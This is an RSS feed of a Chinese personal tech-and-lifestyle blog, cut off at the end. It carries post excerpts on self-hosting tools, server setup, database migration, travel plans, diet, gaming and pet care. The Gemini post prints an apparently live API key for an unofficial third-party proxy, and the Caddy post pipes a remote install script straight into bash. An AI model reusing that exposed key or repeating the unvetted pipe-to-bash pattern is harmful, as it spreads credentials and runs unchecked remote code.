<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>MLOG</title><link>https://qfsyso.github.io/</link><description>Recent content on MLOG</description><generator>Hugo -- 0.126.3</generator><language>zh-CN</language><lastBuildDate>Sun, 25 May 2025 13:07:23 +0800</lastBuildDate><atom:link href="https://qfsyso.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>NodeRed Test YTB Change NetWrok</title><link>https://qfsyso.github.io/posts/nodered-test-ytb-change-netwrok/</link><pubDate>Sun, 25 May 2025 13:07:23 +0800</pubDate><guid>https://qfsyso.github.io/posts/nodered-test-ytb-change-netwrok/</guid><description>Setup Node-RED 一、前提条件：安装 Node.js Node-RED 需要 Node.js 环境，需先安装 Node.js。
打开 Node.js 官网：https://nodejs.org/ 下载并安装 LTS（长期支持）版本 安装完成后打开终端（Win + X → 终端），输入以下命令检查是否安装成功： node -v npm -v 二、全局安装 Node-RED 在命令行中执行以下命令安装 Node-RED：
npm install -g --unsafe-perm node-red 说明：
-g：表示全局安装 --unsafe-perm：解决某些系统中权限问题 三、启动 Node-RED 安装完成后，在终端中运行：
node-red 输出类似以下内容：
Server now running at http://127.0.0.1:1880/ 四、访问 Node-RED 编辑器 打开浏览器访问：
http://localhost:1880 即可进入图形化流程编辑界面。
🛠️ 五、可选：创建桌面快捷方式（.bat 启动脚本） 创建一个文本文件，内容如下：
@echo off title Node-RED node-red pause 保存为 node-red.bat
双击即可启动 Node-RED
六、（可选）将 Node-RED 作为后台服务运行 你可以使用如下工具实现后台服务：
pm2（推荐）：适用于 Node.</description></item><item><title>Snapdrop</title><link>https://qfsyso.github.io/posts/snapdrop/</link><pubDate>Fri, 23 May 2025 00:31:40 +0800</pubDate><guid>https://qfsyso.github.io/posts/snapdrop/</guid><description>Snapdrop：开源浏览器版 AirDrop 文件传输工具 Snapdrop 是一个纯浏览器实现的开源局域网文件传输工具，基于 WebRTC 和 WebSocket 技术，提供类似 Apple AirDrop 的跨平台即时文件共享体验。
🚀 Snapdrop 的优势 设备自动发现：同一局域网内自动识别设备，无需手动连接或配对。 无平台限制：只要能打开浏览器（Chrome / Safari / Edge / Firefox 等）即可使用。 匿名上传与下载：无需登录，匿名操作保障隐私。 端到端加密：基于 WebRTC 的 DTLS 和 SDES 协议，确保传输安全。 PWA 支持：可添加到手机主屏，像 App 一样快捷打开。 ⚙️ 快速使用方式 在线使用 直接访问 https://snapdrop.net 确保设备处于同一 Wi-Fi 或局域网 浏览器打开 Snapdrop 网页 选择设备 → 上传文件 → 对方点击下载即可 自托管部署（增强隐私） 方式一：手动部署 git clone https://github.com/Snapdrop/Snapdrop.git cd Snapdrop npm install npm start 访问：http://localhost:3000
方式二：使用 Docker 一键部署 docker run -d --name=snapdrop -p 80:80 -p 443:443 \ -v /path/to/config:/config \ lscr.</description></item><item><title>Caddy</title><link>https://qfsyso.github.io/posts/caddy/</link><pubDate>Fri, 23 May 2025 00:21:01 +0800</pubDate><guid>https://qfsyso.github.io/posts/caddy/</guid><description>Debian 系统部署 Caddy Web 服务器的详细指南 本文档提供了在 Debian 系统上安装和配置 Caddy Web 服务器的步骤，包括多种安装方法、服务管理、HTTPS 配置、高级功能以及注意事项。此外，还对比了 Caddy 与 Nginx 的主要优势，并介绍了 Caddy 的一些高级特性。
一、安装方法 APT 存储库安装（推荐） 更新系统：
sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y 添加密钥和存储库：
sudo apt install -y debian-archive-keyring apt-transport-https curl curl -1sLf &amp;#39;https://dl.cloudsmith.io/public/caddy/stable/gpg.key&amp;#39; | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg curl -1sLf &amp;#39;https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt&amp;#39; | sudo tee /etc/apt/sources.list.d/caddy-stable.list 安装 Caddy：
sudo apt update &amp;amp;&amp;amp; sudo apt install caddy 快速脚本安装 curl https://getcaddy.com | bash -s personal http.</description></item><item><title>ZhangZhou PlanB</title><link>https://qfsyso.github.io/posts/zhangzhou-planb/</link><pubDate>Thu, 22 May 2025 21:39:50 +0800</pubDate><guid>https://qfsyso.github.io/posts/zhangzhou-planb/</guid><description>漳州 d2 ✅ Day 1：古韵与市井美食之旅 上午｜【南山寺 &amp;amp; 南山桥风光】 南山寺：始建于唐代，是漳州最有历史韵味的寺庙之一，香火旺盛，环境清幽。
南山桥+九龙江景观道：走在桥上可以远眺九龙江两岸，拍照打卡很出片。
📍推荐路线：南山寺 → 南山桥散步 → 漳州碧湖生态公园边走边拍
中午｜【府埕口·闽南古早味】 推荐美食：
沙茶面（阿强沙茶面）
五香卷、卤面
烧肉粽（推荐“阿辉烧肉粽”）
位置：中山路、南昌路一带的小吃非常集中。
下午｜【古城文化游：府埕古街 + 漳州文庙】 府埕古街：保留完整的闽南红砖古厝，适合拍照、喝咖啡、买伴手礼。
漳州文庙：福建保存较完整的文庙之一，有浓厚的儒学气息。
晚上｜【夜游碧湖 + 晚餐】 碧湖夜景：灯光下的碧湖十分迷人，湖边步道凉爽舒适。
推荐晚餐：
阿国海鲜大排档（新浦路附近）或
西洋坪牛排/闽南热炒
Day 2：生态与艺文慢生活之旅 上午｜【龙文湿地公园 or 云洞岩】 龙文湿地公园：适合拍照、晨跑，园内有水杉、鸟类栖息点，绿意盎然。
云洞岩：轻松爬山，俯瞰漳州城区，山中庙宇古迹众多。
📝备注：两个景点都在城区10公里以内，可任选其一安排。
中午｜【大润发美食城 or 延安北路闽南餐厅】 经济实惠选择：大润发楼下的各种小吃摊
推荐餐厅：漳州特色的“金汤酸菜鱼”、“扁食汤”、“蚝仔煎”
下午｜【艺术与休闲：漳州博物馆 + 艺术馆】 漳州博物馆：了解漳州的历史、陶瓷文化
漳州市美术馆 or 漳州图书馆新馆：现代化设计，有时会有展览
晚上｜【尾声晚餐 + 夜市】 胜利东路夜市 or 新浦东市场夜市：探访当地人气夜市
美食推荐：
烧烤串串 四果汤 地瓜粥 芋泥鸭
🎁 补充推荐（如时间宽裕）： 九龙公园：适合带小孩，园内有小动物区。
漳州东南花都（迷你版）：市区花卉市场聚集地，适合买盆栽小花。
漳州市区 ​​d1 ​​上午：漳州古城（芗城区）​​</description></item><item><title>Eat Plan</title><link>https://qfsyso.github.io/posts/eat-plan/</link><pubDate>Wed, 21 May 2025 08:12:26 +0800</pubDate><guid>https://qfsyso.github.io/posts/eat-plan/</guid><description> 时间 餐次 食物 参数 热量（大卡） 替换建议 周一 早餐 全麦面包 + 水煮蛋 + 无糖豆浆 + 拌黄瓜 面包40g，鸡蛋50g，豆浆200ml，黄瓜100g，橄榄油5g 约300 面包可换燕麦粥（30g燕麦+150ml牛奶），黄瓜换圣女果100g 周一 午餐 杂粮饭 + 香煎鸡胸肉 + 清炒西兰花 杂粮饭80g（生重），鸡胸肉150g，西兰花200g，橄榄油8g 约500 杂粮饭换糙米饭，鸡胸肉换鲈鱼/瘦牛肉，西兰花换菠菜/油麦菜 周一 晚餐 蒸红薯 + 白灼虾 + 凉拌菠菜 红薯100g，虾80g，菠菜150g，芝麻油3g 约350 红薯换玉米半根，虾换豆腐100g，菠菜换莴笋/绿豆芽 周二 早餐 燕麦粥 + 水煮蛋 + 圣女果 燕麦30g，牛奶150ml，鸡蛋50g，圣女果100g 约280 燕麦换全麦面包2片，圣女果换黄瓜100g 周二 午餐 糙米饭 + 清蒸鲈鱼 + 清炒油麦菜 糙米饭100g（生重），鲈鱼150g，油麦菜200g，橄榄油5g 约520 鲈鱼换巴沙鱼/鸡胸肉，油麦菜换空心菜/西兰花 周二 晚餐 荞麦面 + 卤鸡腿（去皮） + 番茄冬瓜汤 荞麦面50g（干重），鸡腿100g，番茄50g，冬瓜100g，橄榄油3g 约350 荞麦面换魔芋面，鸡腿换虾仁/瘦牛肉，冬瓜汤换紫菜蛋花汤 周三 早餐 全麦三明治 + 无糖酸奶 面包40g，生菜50g，火腿50g，番茄30g，酸奶100g 约320 三明治换包子（全麦素馅80g），酸奶换豆浆200ml 周三 午餐 小米饭 + 瘦牛肉炒青椒 + 凉拌莴笋 小米饭100g（生重），牛肉120g，青椒150g，莴笋150g，橄榄油8g 约550 小米饭换藜麦饭，牛肉换鸡胸肉，青椒换胡萝卜/芹菜 周三 晚餐 蒸土豆 + 豆腐炖白菜 + 清炒绿豆芽 土豆150g，豆腐100g，白菜200g，绿豆芽100g，橄榄油6g 约330 土豆换南瓜，豆腐换鸡蛋1个（蒸蛋），绿豆芽换娃娃菜 周四 早餐 玉米 + 水煮蛋 + 黑咖啡 + 水煮西兰花 玉米100g，鸡蛋50g，西兰花50g 约250 玉米换燕麦粥（30g燕麦），西兰花换黄瓜100g 周四 午餐 意大利面 + 烤鸡胸肉 + 番茄菠菜沙拉 意面80g（干重），鸡胸肉120g，番茄100g，菠菜100g，橄榄油5g 约530 意面换荞麦面，鸡胸肉换鳕鱼，沙拉换清炒菠菜 周四 晚餐 蒸南瓜 + 清炖鲫鱼 + 清炒空心菜 南瓜150g，鲫鱼150g，空心菜200g，橄榄油3g 约380 南瓜换山药，鲫鱼换虾仁/豆腐，空心菜换油菜 周五 早餐 全麦素馅包子 + 茶叶蛋 + 凉拌海带丝 包子80g，鸡蛋50g，海带丝50g 约280 包子换燕麦饼（30g燕麦+鸡蛋1个），海带丝换莴笋100g 周五 午餐 杂粮饭（大米 + 藜麦） + 香煎巴沙鱼 + 蒜蓉西兰花 杂粮饭100g（生重），巴沙鱼150g，西兰花200g，橄榄油5g 约510 巴沙鱼换鲈鱼/鸡胸肉，西兰花换芦笋/生菜 周五 晚餐 燕麦饼 + 虾仁蒸蛋 + 清炒娃娃菜 燕麦30g，鸡蛋50g，虾仁50g，娃娃菜150g，橄榄油3g 约320 燕麦饼换全麦面包1片，虾仁换瘦牛肉，娃娃菜换豆芽 周六 早餐 全麦面包 + 牛油果 + 水煮蛋 + 黄瓜 面包20g，牛油果30g，鸡蛋50g，黄瓜100g 约260 牛油果换无糖酸奶100g，黄瓜换小番茄100g 周六 午餐 糙米饭 + 红烧瘦肉 + 清炒胡萝卜丝 糙米饭80g（生重），瘦猪肉100g，胡萝卜150g，橄榄油3g 约480 瘦肉换鸡胸肉（烤/蒸），胡萝卜换青椒/芹菜 周六 晚餐 魔芋丝结 + 卤牛肉 + 菠菜蛋花汤 魔芋丝100g，牛肉100g，菠菜50g，鸡蛋50g，橄榄油2g 约310 魔芋丝换荞麦面50g，牛肉换虾仁，蛋花汤换冬瓜汤 周日 早餐 小米粥 + 酱牛肉 + 拌莴笋 小米30g，牛肉50g，莴笋100g，橄榄油2g 约220 小米粥换玉米半根，牛肉换水煮蛋1个，莴笋换海带丝 周日 午餐 荞麦面 + 烤鸡胸肉 + 凉拌木耳 荞麦面70g（干重），鸡胸肉120g，木耳100g，橄榄油3g 约490 荞麦面换意大利面，鸡胸肉换瘦牛肉，木耳换黄瓜沙拉 周日 晚餐 蒸山药 + 清蒸虾 + 清炒油菜 山药150g，虾80g，油菜200g，橄榄油5g 约350 山药换红薯，虾换巴沙鱼，油菜换西兰花 使用说明 热量控制：每日总热量约 1500-1700 大卡，可根据体重变化调整主食或蛋白质重量（如体重下降过慢，可减少主食 10-20g / 餐）。 灵活替换：同类别食材（如主食、蛋白质、蔬菜）可按 “替换建议” 自由搭配，避免单调。 烹饪提示：食用油总量建议≤10g / 天，尽量使用橄榄油或菜籽油，避免油炸、糖醋做法。 加餐选项：可在上午 10 点 / 下午 3 点加食低脂酸奶 100g 或 10g 坚果（单独记录热量）。</description></item><item><title>Honor Of King</title><link>https://qfsyso.github.io/posts/honor-of-king/</link><pubDate>Thu, 15 May 2025 20:36:50 +0800</pubDate><guid>https://qfsyso.github.io/posts/honor-of-king/</guid><description>镜 一、技能机制解析 被动-铸镜
攻击目标后触发镜像标记，再次攻击可触发额外伤害并刷新技能CD，刷野/连招时需穿插平A触发被动。 一技能-开锋
突进并强化普攻，主要位移和起手技能，命中减少冷却时间。 二技能-裂空
范围伤害+回血+减速，开局优先加点用于续航和快速清野。 三技能-见影
定身敌人并展开镜像场，本体与镜像协同攻击，核心连招与换位收割技能。 二、出装与铭文推荐 出装方案 核心装备：
红色打野刀 → 抵抗之靴 → 暗影战斧 → 宗师之力 → 破军 → 碎星锤/名刀 高爆发流：破军+碎星锤瞬秒脆皮 生存调整：敌方控制多时换魔女斗篷，物理爆发高换反伤刺甲 铭文搭配 通用暴击流：
10隐匿（移速/攻击） + 10鹰眼（穿透） + 2红月8异变（穿透+暴击） 极致爆发流：
10祸源（暴击率） + 10隐匿 + 10鹰眼 三、连招技巧 基础连招：
1A2A1A（3级前清野/消耗） 突进收割：
31A21A（大招起手定身，接技能穿插平A） 飞雷神连招：
31A2A1A3（镜像场内反复换位，持续刷新技能） 四、打野节奏思路 前期（1-4级） 开局红BUFF：
点二技能快速清野，利用被动刷新CD提升效率 抢河道之灵：
1分钟时抵达中路，配合惩戒争夺经济。 反野策略：
针对敌方弱势打野（如李白、阿轲）入侵蓝区，压制发育。 中期（4-10级） 抓人优先级：
优先抓发育路，利用大招越塔强杀脆皮。 控龙时机：
击杀敌方打野后立即开暴君/主宰，扩大团队优势。 后期（10级后） 带线牵制：
利用镜像快速清兵推塔，迫使敌方回防。 绕后切C：
团战第二时间进场，直切射手/法师，连招秒杀后撤离。 五、团战与细节技巧 进场时机：
等待敌方交关键控制技能（如张良大招）后再切入。 镜像场运用：
横放大招可封锁路径，竖放便于换位追击残血。 探草技巧：</description></item><item><title>Debian Ng Ssl</title><link>https://qfsyso.github.io/posts/debian-ng-ssl/</link><pubDate>Thu, 15 May 2025 00:14:46 +0800</pubDate><guid>https://qfsyso.github.io/posts/debian-ng-ssl/</guid><description>在 Debian 服务器上为部署在 Nginx 上的网站申请 SSL 证书， 一般使用 Let&amp;rsquo;s Encrypt 提供的免费证书最为方便、主流。推荐通过 Certbot 工具来自动申请和配置。 下面是详细步骤：
🛠️ 步骤一：安装 Certbot 和 Nginx 插件 sudo apt update sudo apt install certbot python3-certbot-nginx -y 🖥️ 步骤二：确保你的 Nginx 配置正确 确保网站已经通过 HTTP 能正常访问。
Nginx 配置中必须有一个 server_name 指向你的域名，例如：
server { listen 80; server_name yourdomain.com www.yourdomain.com; root /var/www/yourdomain; index index.html index.htm; location / { try_files $uri $uri/ =404; } } 🌐 步骤三：申请 SSL 证书并自动配置 Nginx sudo certbot --nginx 然后按提示输入：</description></item><item><title>Nanao PlanB</title><link>https://qfsyso.github.io/posts/nanao-planb/</link><pubDate>Wed, 14 May 2025 23:00:12 +0800</pubDate><guid>https://qfsyso.github.io/posts/nanao-planb/</guid><description>🌟 ​​南澳岛后宅镇两天一夜深度攻略​​ ​​住宿推荐​​：优先选择后宅镇海景民宿
夜游后宅镇 ​​🌙 夜晚到达（18:00-21:00）​​
​​后宅夜市漫游​​ 从南澳大桥进岛后直奔海滨路夜市，重点体验： ✅ ​​文婶甘草水果​​：甘梅粉+青芒是绝配，本地人最爱的解腻神器 ✅ ​​成伯反沙店​​：必点反沙咸蛋黄（比芋头更惊艳），糖霜裹得均匀不粘牙 ✅ ​​南澳岛打卡果汁冰​​：认准青澳湾铂雅酒店分店，推荐加脆波波
📍贴士：夜市集中在龙滨路与港畔路交叉口，20:00后最热闹 ​
​Day1：经典环岛线​​ ​⛅ 上午行程（8:00-12:00）​​ ​长山尾灯塔​​ 拍摄技巧：用广角镜头将灯塔与南澳大桥同框，清晨7:00前到达可避开旅行团 交通：601路公交直达（后宅镇中心出发约20分钟），自驾停车费10元/小时
​田仔地质公园​​ 隐藏玩法：退潮时在礁石区赶海（需自备夹子/水桶），常见小螃蟹/贝类 安全提醒：浪大时勿靠近黑色礁石区（青苔易滑）
​前江湾沙滩​​ 网红墙打卡：避开正午强光，侧光拍摄「我❤南澳」字样更出片 渔民体验：9:00-10:00可围观渔船卸货，直接向渔民购买新鲜鱼获（需砍价）
🍜 午餐推荐（12:30-14:00）​​ ​​黄记海鲜沙筛面​​[本地推荐]：鲍鱼+鲜虾沙筛汤面，汤底用鱼骨熬制 ​​浩利食店​​：紫菜炒饭配苦瓜汤，人均30元饱腹感十足 避坑指南：慎选沙滩边流动摊贩，易出现海鲜不新鲜或价格虚高
🌞 下午行程（14:30-18:30）​​ ​后宅三庙文化巡礼​​
武帝庙： 重点看屋脊嵌瓷工艺（西游记人物场景栩栩如生）
天后宫： 若逢初一/十五，可参与渔民祈福仪式（常集中在16:00左右） ​​山顶村深度体验​​ 海鲜采购：山顶市场下午15:00上新，推荐宅鱿（60元/斤）和鱼露（认准「金龙牌」） 手作体验：村内「阿嫲粿品坊」可预约红桃粿制作（需提前2小时联系）
​白鹭生态公园​​ 最佳观鸟点：西侧芦苇丛（17:00后白鹭归巢） 摄影建议：携带长焦镜头捕捉白鹭捕食瞬间
🌄 傍晚备选​​ ​​钱澳湾灯塔​​：白色塔身+薄荷绿玻璃窗，适合拍摄日系风写真（距离后宅镇6公里，打车约15分钟）
🍲 晚餐推荐​​ ​​裕福记海鲜鸡炉​​[攻略推荐]：石橄榄汤底+现杀走地鸡，搭配南澳紫菜涮煮 ​​鲜宴·海鲜私厨​​[攻略推荐]：芝士焗小青龙128元/只，性价比高于大排档
​Day2：人文探索 &amp;amp; 周边延伸​​ 🌅 上午行程（8:30-12:00）​​ ​后花园生态村​​ 必玩项目：海阔天空观景台（俯瞰360°海天全景） 特色体验：25元/人含茶座的「农家乐」，品凤凰单丛赏茶田风光
​​风车山探秘​​ 自驾路线：导航「蛴仔澎」（注意45-46号风机机位最佳） 非自驾方案：包三轮车上下山（约80元/车），山路陡峭慎选电动车
🦞 午餐推荐​​ ​​金龙潮汕私房菜​​：卤水鹅肝拼盘+砂锅粥，人均70元吃撑 ​​胖哥有炸​​[攻略推荐]：炸九肚鱼外酥里嫩，配薄荷酱解腻
🌿 下午行程（14:00-17:00）​​ ​​总兵府​​ 历史迷必看：明代海防地图/郑成功练兵遗址，蹭导游讲解更生动</description></item><item><title>For oo</title><link>https://qfsyso.github.io/posts/for-oo/</link><pubDate>Wed, 14 May 2025 22:49:11 +0800</pubDate><guid>https://qfsyso.github.io/posts/for-oo/</guid><description>购买前 量力而行，心意到了就行了。 这南墙也不一定非要撞过去。
购买渠道： 某东 （隔天就到了） 淘天喵（便宜一点） 拼夕夕百亿补贴 （便宜亿点）
护肤类 洁面产品： 用于清洁面部皮肤，去除污垢、油脂和杂质，为后续化妆步骤打下良好的基础。
化妆水 / 爽肤水： 帮助收缩毛孔，补水保湿，使肌肤更加水润，为上妆做好准备。
乳液 / 面霜： 滋润肌肤，锁住水分，防止皮肤干燥，使底妆更加服帖。
注意 ​​敏感肌​​：优先无酒精、无香精的氨基酸洁面+修护型水乳。 ​​油痘肌​​：含酸类或控油成分的洁面+平衡水油的水乳）。 ​​干皮​​：保湿抗氧化洁面+抗衰提亮水乳。 性价比党/​​​​学生党：经典国货套装珀莱雅/自然堂闭眼入。
洁面产品： 油皮：可以选择清洁力较强的非 “皂性” 洁面产品，如含有水杨酸、皂基等成分的洗面奶，能有效去除皮肤表面多余的油脂和污垢。 干皮和敏感皮：应选用温和、保湿的洁面产品，如氨基酸洗面奶，其 pH 值接近皮肤的 pH 值，能在清洁的同时保护皮肤的屏障功能。
化妆水 / 爽肤水： 油皮：适合使用清爽型的化妆水，含有金缕梅、薄荷等成分，具有控油、收缩毛孔的作用。 干皮：可选择滋润型的化妆水，含有透明质酸、甘油等保湿成分，能为肌肤补充水分。 敏感皮：则适合具有舒缓、修复功能的爽肤水，含有马齿苋、洋甘菊等成分，可减轻皮肤的敏感症状。
精华液： 美白：想要美白的人群可选择含有烟酰胺、维生素 C、传明酸等成分的精华液，能抑制黑色素的生成，提亮肤色。 抗皱：有抗皱需求的人群可以使用含有视黄醇、胜肽、玻色因等成分的精华液，能促进胶原蛋白的生成，减少皱纹。 保湿：干性皮肤可使用含有玻尿酸、角鲨烷等成分的保湿精华液，为肌肤深层补水保湿。
乳液 / 面霜： 油皮：选择质地轻薄、不油腻的乳液，含有茶树精油、薰衣草等成分，具有控油、消炎的作用。 干皮：适合质地浓稠、滋润度高的面霜，含有羊毛脂、凡士林等成分，能在皮肤表面形成一层保护膜，防止水分流失。 混合皮：T 区使用清爽的乳液，两颊使用滋润的面霜。
眼霜： 黑眼圈：针对黑眼圈问题，可选择含有咖啡因、维生素 K 等成分的眼霜，能促进眼部血液循环，减轻黑眼圈。 眼部细纹：有眼部细纹的人群可以使用含有胶原蛋白、辅酶 Q10 等成分的眼霜，能增强眼部肌肤的弹性。
buybuybuy 可复美 柔肤水 500ml 65 补水保湿，质地清爽不粘腻，易于吸收。可用于日常补水、湿敷等。 珀莱雅红宝石面霜 50g 165 保湿滋养，淡纹紧致，饱满肌肤 珀莱雅水动力护肤套装 [100g洁面 135ml水乳] 79 plus版本 面+水+乳+霜 119 改善面部毛孔粗大、暗沉粗糙等问题，帮助肌肤锁水保湿，调节水油平衡，令肌肤细腻通透。 优时颜 [水150ml+乳100g] 140</description></item><item><title>MSSQL 2 MySQL</title><link>https://qfsyso.github.io/posts/mssql-2-mysql/</link><pubDate>Thu, 01 May 2025 14:53:42 +0800</pubDate><guid>https://qfsyso.github.io/posts/mssql-2-mysql/</guid><description>DBeaver https://github.com/dbeaver/dbeaver/releases 简介：一款开源的多数据库管理工具，支持多种数据库系统，包括SQL Server和MySQL。利用DBeaver，可以轻松地在不同数据库系统之间进行数据迁移。 操作步骤：
安装DBeaver： 从官网下载并安装DBeaver到计算机上。
连接到SQL Server： 在DBeaver中，点击“Database” &amp;gt; “New Database Connection”，选择“SQL Server”并填写连接信息。
连接到MySQL： 同样的步骤，点击“Database” &amp;gt; “New Database Connection”，选择“MySQL”并填写连接信息。
导出SQL Server数据： 在成功连接SQL Server后，选择需要迁移的表，然后右键点击并选择“Export Data”，在弹出的窗口中，选择“MySQL”作为目标。
导入到MySQL： 在导出设置中，配置好MySQL连接的信息，并选择目标数据库，点击“Start”开始导入过程。
主键 自增处理 -- 修改现有列为自增主键 ALTER TABLE ZX.Lies MODIFY COLUMN ID INT AUTO_INCREMENT PRIMARY KEY; ALTER TABLE your_table_name MODIFY Content VARCHAR(1000); ALTER TABLE zx.Lies MODIFY Content6 VARCHAR(1000); DROP TABLE zx.ZhongjieProducts MySQL Workbench Migration Wizard ​​步骤：​
安装依赖​​： 安装 MySQL Workbench。 https://dev.mysql.com/downloads/workbench/ 安装 ODBC Driver for SQL Server。 https://learn.</description></item><item><title>SingleCache</title><link>https://qfsyso.github.io/posts/singlecache/</link><pubDate>Sat, 26 Apr 2025 01:51:10 +0800</pubDate><guid>https://qfsyso.github.io/posts/singlecache/</guid><description>.NET 单例缓存
模拟数据库用户信息查询 using Microsoft.Extensions.Caching.Memory; using Microsoft.Extensions.Logging; using System; public static class CacheManager { // // 缓存实例 // private static readonly IMemoryCache _cache = new MemoryCache(new MemoryCacheOptions // { // SizeLimit = 1024 // 限制缓存最大条目数 // }); private static readonly MemoryCache _cache = new MemoryCache(new MemoryCacheOptions()); private static readonly ILogger _logger = LoggerFactory.Create(builder =&amp;gt; builder.AddConsole()).CreateLogger(&amp;#34;CacheManager&amp;#34;); /// &amp;lt;summary&amp;gt; /// 获取或创建缓存项（泛型方法） /// &amp;lt;/summary&amp;gt; public static T GetOrCreate&amp;lt;T&amp;gt;(string key, Func&amp;lt;ICacheEntry, T&amp;gt; factory, TimeSpan? expiration = null) { try { return _cache.</description></item><item><title>Debian SCP</title><link>https://qfsyso.github.io/posts/debian-scp/</link><pubDate>Sat, 26 Apr 2025 01:17:02 +0800</pubDate><guid>https://qfsyso.github.io/posts/debian-scp/</guid><description>Debian 系统之间传输文件
​​1. 使用 scp（基于 SSH 的安全传输）​​ ​​适用场景​​：快速传输单个文件或目录，适合命令行操作。
​​基本语法​​：
scp [选项] 源文件 目标地址 ​​``` 示例​​： ​​从本地传输到远程服务器​​： ```bash scp /path/to/local/file.txt username@remote_ip:/path/to/remote/directory/ 输入远程服务器的用户密码后，文件会被传输。 ​​从远程服务器下载到本地​​：
scp username@remote_ip:/path/to/remote/file.txt /path/to/local/directory/ ​​传输整个目录​​（使用 -r 递归）：
scp -r /path/to/local/directory/ username@remote_ip:/path/to/remote/directory/ 如果目标端口 2222 scp -P 2222 /path/to/file username@ip:/path/to/destination ​2. 使用 rsync（高效同步工具）​​ ​​适用场景​​：增量同步文件或目录，适合大文件或频繁更新。
​​基本语法​​：
rsync [选项] 源路径 目标路径 ​``` ​示例​​： ​​同步本地目录到远程服务器​​： ```bash rsync -avz /path/to/local/directory/ username@remote_ip:/path/to/remote/directory/ -a：归档模式（保留权限、时间戳等） -v：显示详细过程 -z：压缩传输 ​​从远程服务器同步到本地​​：
rsync -avz username@remote_ip:/path/to/remote/directory/ /path/to/local/directory/ ​​3. 使用 sftp（SSH 文件传输协议）​​ ​​适用场景​​：交互式文件传输（类似 FTP）。</description></item><item><title>Gemini Flash</title><link>https://qfsyso.github.io/posts/gemini-flash/</link><pubDate>Sat, 26 Apr 2025 00:44:11 +0800</pubDate><guid>https://qfsyso.github.io/posts/gemini-flash/</guid><description>免费gemini2.5 API 感谢佬友 bohe佬
lobehub https://chat-preview.lobehub.com/chat
docker lobe docker run -d -p 32100:3210 \ -e OPENAI_API_KEY=sk-GBxyVLH3pWoqFkLRC63PZhKPsVSPgLElvFtysmxPvZhZX5gi \ -e OPENAI_PROXY_URL=https://x666.me/v1 \ -e ACCESS_CODE=lobe66 \ --name lobe-chat \ lobehub/lobe-chat https://lobehub.com/zh/docs/self-hosting/platform/docker
模型设置 openai sk-xx api地址 xxx/v1 获取模型列表 检查
newapi docker run -d -p 32100:3210 \ -e OPENAI_API_KEY=sk-xxx \ -e OPENAI_PROXY_URL=https://xxx.me/v1 \ -e ACCESS_CODE=lobe66 \ --name lobe-chat \ lobehub/lobe-chat #or docker run --name new-api -d --restart always \ -p 3000:3000 \ -e TZ=Asia/Shanghai \ -v /your/data/path:/data \ calciumion/new-api:latest https://docs.</description></item><item><title>Hamster</title><link>https://qfsyso.github.io/posts/hamster/</link><pubDate>Mon, 07 Apr 2025 00:47:48 +0800</pubDate><guid>https://qfsyso.github.io/posts/hamster/</guid><description>仓鼠小记
✅ 主食类（基础粮） 仓鼠专用粮（建议）：市面上配比好的颗粒粮或混合粮，含有谷物、种子、坚果、维生素等，营养均衡。
谷物类：小麦、燕麦、玉米、糙米、高粱。
种子类：葵花籽（要适量）、南瓜籽、亚麻籽。
📝 小贴士：不要只喂葵花籽，会太油腻，容易导致肥胖、脱毛。
🥬 蔬果类（辅助） 可以吃的蔬果（洗净、少量喂）：
胡萝卜
黄瓜
生菜（少量）
苹果（去籽）
南瓜
西兰花
香瓜、梨子（少量）
🍎 注意：水果含糖高，要控制量，每次一点点！
🥩 蛋白质补充 煮熟的鸡蛋白
少量煮熟鸡肉、鱼肉（不加盐）
面包虫、蚕蛹（仓鼠很爱！）
酸奶滴（专用宠物用）
🐛 面包虫是仓鼠最爱的“肉肉”，尤其怀孕或哺乳期的母鼠，补得刚刚好。
❌ 不能吃的食物（危险） 食物 原因 洋葱、大蒜 有毒成分，伤害红细胞 巧克力、糖果 对仓鼠致命，有可可碱和高糖分 柑橘类水果 太酸，刺激肠胃 奶制品（如牛奶） 容易腹泻 辛辣或油炸食品 绝对禁止 酒精、咖啡 有毒致命 💧 喝水也重要！ 一定要每天提供干净的清水，使用小水壶吊挂在笼子上，避免污染。
🐹 仓鼠每日喂食计划（标准版） 时间 食物类别 举例和说明 早上 🕘 ✅ 主粮（基础粮） 仓鼠专用混合粮约1小勺（8～10g） 放入主食碗中，仓鼠会分次吃或藏起来 中午 🕛 ✅ 新鲜蔬菜/少量水果 🥕胡萝卜1小块 🥒黄瓜薄片1～2片 🍎苹果碎1小块（不要喂果核） 💡隔天替换，防止拉肚子 傍晚 🕔 ✅ 蛋白质补充 面包虫2～3条（或熟蛋白少许） 换着来：鸡肉丝、宠物酸奶滴、少量煮鸡蛋 全天 ✅ 清水补充 确保水壶干净，水要新鲜每天换一次 每周安排 🔁 一周轮换食材 每周给一次南瓜、玉米、香瓜、梨，少量更换口味保持食欲</description></item><item><title>High Concurrency Img Testing</title><link>https://qfsyso.github.io/posts/high-concurrency-img-testing/</link><pubDate>Mon, 31 Mar 2025 22:40:27 +0800</pubDate><guid>https://qfsyso.github.io/posts/high-concurrency-img-testing/</guid><description>批量生图 using SkiaSharp; public class Program { static void Main(string[] args) { Console.Write(&amp;#34;请输入要生成的图片数量：&amp;#34;); if (!int.TryParse(Console.ReadLine(), out int count) || count &amp;lt; 1) { Console.WriteLine(&amp;#34;输入无效，请输入大于0的整数&amp;#34;); return; } // 通过调整图像尺寸控制文件大小（经测试约1MB） const int imageSize = 2800; // 控制图片尺寸 const string outputDir = &amp;#34;OutputImages&amp;#34;; System.IO.Directory.CreateDirectory(outputDir); var sw = System.Diagnostics.Stopwatch.StartNew(); for (int i = 1; i &amp;lt;= count; i++) { using var bitmap = CreateNumberImage(imageSize, i); SaveImage(bitmap, $&amp;#34;{outputDir}/x{i}.png&amp;#34;); Console.WriteLine($&amp;#34;已生成：x{i}.png&amp;#34;); } Console.WriteLine($&amp;#34;\n生成完成！耗时：{sw.Elapsed.TotalSeconds:F2}秒&amp;#34;); Console.WriteLine($&amp;#34;输出目录：{System.IO.Path.GetFullPath(outputDir)}&amp;#34;); } static SKBitmap CreateNumberImage(int size, int number) { var bitmap = new SKBitmap(size, size); using var canvas = new SKCanvas(bitmap); // 填充白色背景 canvas.</description></item><item><title>TypeScript Array Tuple</title><link>https://qfsyso.github.io/posts/typescript-array-tuple/</link><pubDate>Mon, 